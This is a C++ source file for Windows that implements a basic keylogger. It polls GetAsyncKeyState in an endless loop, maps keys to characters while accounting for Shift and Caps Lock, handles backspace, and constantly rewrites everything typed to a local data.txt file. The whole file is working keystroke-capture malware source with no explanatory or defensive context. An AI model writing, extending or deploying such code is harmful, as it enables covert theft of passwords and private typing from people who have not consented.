#include <iostream>
#include <fstream> //for working with files
#include <string>
#include <windows.h>
using namespace std;

string storage;

void log() {
    ofstream data("data.txt", ios::trunc);
    if (data.is_open()) {
        data << storage;
    }else {
        cout << "failed to open file" << endl;
    }
}

bool capsLockHandling() {
    return(GetKeyState(VK_CAPITAL) & 0x0001) != 0;
}

bool shiftHandling() {
    return(GetKeyState(VK_SHIFT) & 0x8000) != 0;
}

string keyToString(int key) {
    if (key >= 'A' && key <= 'Z') {
        bool CapsLock = capsLockHandling();
        bool Shift = shiftHandling();

        if (CapsLock ^ Shift) { //XOR
            return string(1, char(key)); // Uppercase
        } else {
            return string(1, char(key + 32)); // Lowercase A+32 = a
        }

    }

    if (key >= '0' && key <= '9') {
        bool Shift = shiftHandling();
        if (Shift) {
            switch (key) {
                case '1': return "!";
                case '2': return "@";
                case '3': return "#";
                case '4': return "$";
                case '5': return "%";
                case '6': return "^";
                case '7': return "&";
                case '8': return "*";
                case '9': return "(";
                case '0': return ")";
            }
        } else {
            return string(1, char(key));
        }
    }
    switch (key) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "\n";
        case VK_TAB: return "\t";
        default: return "";
    }
}

void handle_backspace() {
    if (!storage.empty()) {
        storage.pop_back();
    }
    log();
}


int main() {
    while (true) {
        for (int key = 8; key<=190; key++) {
            if (GetAsyncKeyState(key) & 0x0001) {
                if (key == VK_BACK) {
                    handle_backspace();
                }else {
                    string keySTR = keyToString(key);
                    if(!keySTR.empty()) {
                        storage += keySTR;
                    }
                    log();
                }
            }
        }
    }

    return 0;
}